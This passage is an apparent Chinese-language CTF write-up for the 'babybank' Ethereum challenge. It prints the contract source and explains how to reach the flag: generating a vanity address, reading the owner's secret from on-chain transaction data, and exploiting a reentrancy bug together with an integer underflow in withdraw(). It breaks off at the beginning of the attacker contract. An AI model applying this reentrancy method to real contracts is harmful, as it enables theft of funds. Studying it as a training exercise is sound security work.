punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> <span class=\"token number\">10000000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        owner<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">emit</span> <span class=\"token function\">sendflag</span><span class=\"token punctuation\">(</span>md5ofteamtoken<span class=\"token punctuation\">,</span>b64email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyOwner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr></table></figure><p>知道合约地址的情况下，我们可以通过合约反编译器对题目合约进行反编译来获取合约源码。</p>\n<p>反编译出来的代码并不是看的很懂，所以观摩了大佬整理的源码。</p>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.4.23</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">contract</span> <span class=\"token class-name\">babybank</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balance<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> level<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token builtin\">uint</span> secret<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">//Don't leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">//Gmail is ok. 163 and qq may have some problems.</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">event</span> <span class=\"token function\">sendflag</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> md5ofteamtoken<span class=\"token punctuation\">,</span><span class=\"token builtin\">string</span> b64email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token comment\">//pay for flag</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">payforflag</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> md5ofteamtoken<span class=\"token punctuation\">,</span><span class=\"token builtin\">string</span> b64email<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> <span class=\"token number\">10000000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        owner<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">emit</span> <span class=\"token function\">sendflag</span><span class=\"token punctuation\">(</span>md5ofteamtoken<span class=\"token punctuation\">,</span>b64email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyOwner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token comment\">//challenge 1 </span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">profit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>level<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span><span class=\"token operator\">==</span><span class=\"token number\">0xb1b1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        level<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token comment\">//challenge 2</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">set_secret</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> new_secret<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        secret<span class=\"token operator\">=</span>new_secret<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">guess</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> guess_secret<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>guess_secret<span class=\"token operator\">==</span>secret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>level<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        level<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token comment\">//challenge 3</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amount<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>level<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        balance<span class=\"token punctuation\">[</span>to<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> amount<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token comment\">//leak function</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amount<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>amount<span class=\"token operator\">*</span><span class=\"token number\">100000000000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> amount<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"源码分析\"><a class=\"anchor\" href=\"#源码分析\">#</a> 源码分析</h2>\n<p>下面分析一下源码，根据题目要求，我们需要执行 <code>payforflag</code>  这个函数。</p>\n<p>在这个函数中，存在一个条件 <code>balance[msg.sender] &gt;= 10000000000</code> ，再看看其他函数，能够帮我们增加 balance 的只有 <code>profit</code>  和 <code>guess</code>  两个函数。 <code>guess</code>  函数中，需要 <code>level[msg.sender]==1</code>  才能够执行，而在 <code>profit</code>  函数中则是 <code>level[msg.sender]==0</code> ，考虑到初始 balance 和 level 为 0，很明显我们需要先执行 <code>profit</code>  函数。</p>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">profit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>level<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span><span class=\"token operator\">==</span><span class=\"token number\">0xb1b1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        level<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>除了 level 需要为 0， <code>profit</code>  函数还需要一个条件，即 <code>uint(msg.sender) &amp; 0xffff==0xb1b1</code> ，已知 &amp; 运算是相同为 1，不同为 0，因此 <code>msg.sender</code>  的末尾应该为 0xb1b1，即账户地址末四位为 0xb1b1。</p>\n<p>这里可以通过一个地址生成器来获取末四位为 0xb1b1 的账户（后面简称账户 A）</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly92YW5pdHktZXRoLnRrLw==\">https://vanity-eth.tk/</span></p>\n</blockquote>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/202203082230.png\" alt=\"\" title=\"生成特定账户\" /></p>\n<p>获取到账户 A 后，利用私钥将账户 A 添加至 matemask 钱包，我们通过账户 A 来执行 <code>profit</code>  函数。我们先把合约编码编译并通过编译器的 <code>at address</code>  功能放置在 <code>0xD630cb8c3bbfd38d1880b8256eE06d168EE3859c</code>  上（题目给出的合约地址）。</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220308222625.png\" alt=\"\" title=\"部署题目合约\" /></p>\n<p>部署好合约后，matemask 中选择连接账户 A， 执行 <code>profit</code>  函数，执行完成后，再下方 <code>balance</code>  和 <code>level</code>  两个按钮中输入账户 A 的地址，可以查看当前 balance 和 level 为 1。</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220308223434.png\" alt=\"\" title=\"执行profit函数\" /></p>\n<p>在 level 为 1 后，我们就可以执行 <code>guess</code>  函数了，下面分析一下 <code>guess</code>  函数。</p>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">guess</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> guess_secret<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>guess_secret<span class=\"token operator\">==</span>secret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>level<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        level<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>除了 <code>level[msg.sender]==1</code>  以外，还需要让 <code>guess_secret==secret</code> ， <code>guess_secret</code>  是我们输入的值，那么 secret 又是什么呢？我们看看 <code>set_secret</code>  函数。</p>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">set_secret</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> new_secret<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        secret<span class=\"token operator\">=</span>new_secret<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可以看到 secret 是由 new_secret 决定的，但是我们注意到 <code>set_secret</code>  这个函数定义时有个 <code>onlyOwner</code> ，</p>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyOwner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可以看出，只有合约的主人，也就是部署合约的账户才能够调用 <code>set_secret</code>  函数，显然我们并没有办法重新赋值 secret，那么我们怎么才能知道 secret 到底是什么呢？</p>\n<p>我们可以通过区块链浏览器查看一下部署合约的账户 <code>0x409dd71C0E5500dA1e0489d4885411b1Da52d4c2</code> ，发现他最后一条交易信息执行的就是 <code>set_secret</code>  函数。</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/202203082242.png\" alt=\"\" title=\"查看合约主人的交易记录\" /></p>\n<p>点开这条交易记录，在最下方的 Input Data 中，可以选择 decode data 来查看数据。</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220308224456.png\" alt=\"\" title=\"解密输入数据\" /></p>\n<p>可以看到 new_secret 为 <code>1123581321345589</code> ，知道 secret 后，将其输入至 <code>guess</code>  按钮旁的编辑框中，点击 <code>guess</code>  按钮执行函数。待执行完成后再次点击 <code>balance</code>  和 <code>level</code>  两个按钮，可以查看当前 balance 和 level 为 2。</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220308224813.png\" alt=\"\" title=\"执行guess函数\" /></p>\n<p>前面我们说到能够帮我们增加 balance 的只有 <code>profit</code>  和 <code>guess</code>  两个函数。现在这两个函数都执行完了，我们的 balance 才为 2，显然不够 <code>payforflag</code>  函数所需要的 10000000000。再看看有没有还没有用到的函数，这时候，我们发现了 <code>withdraw</code>  函数。</p>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amount<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>amount<span class=\"token operator\">*</span><span class=\"token number\">100000000000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> amount<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>仔细观察 <code>withdraw</code>  函数，我们发现了两个敏感点，第一个是 <code>msg.sender.call.value(amount*100000000000000)();</code> ，我们知道 call 函数会造成重入攻击；另一个是 <code>balance[msg.sender] -= amount;</code> ，它会造成整型下溢出。</p>\n<p>为了执行上面两句带有漏洞的函数，我们需要通过两个条件，一个是输入的 amount 必须为 2，另一个是我们进行交互的合约的 balance 必须大于等于 amount 也就是 2。因此我们部署一个能够进行重入攻击的合约，通过反复调用 <code>withdraw</code>  函数来让 balance 实现整型下溢出，变成一个极大的数字。</p>\n<h2 id=\"进行攻击\"><a class=\"anchor\" href=\"#进行攻击\">#</a> 进行攻击</h2>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.4.23</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 声明合约源码函数</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">interface</span> <span class=\"token class-name\">BabybankInterface</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">profit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">guess</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> number<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">payforflag</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> md5ofteamtoken<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> b64email<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token 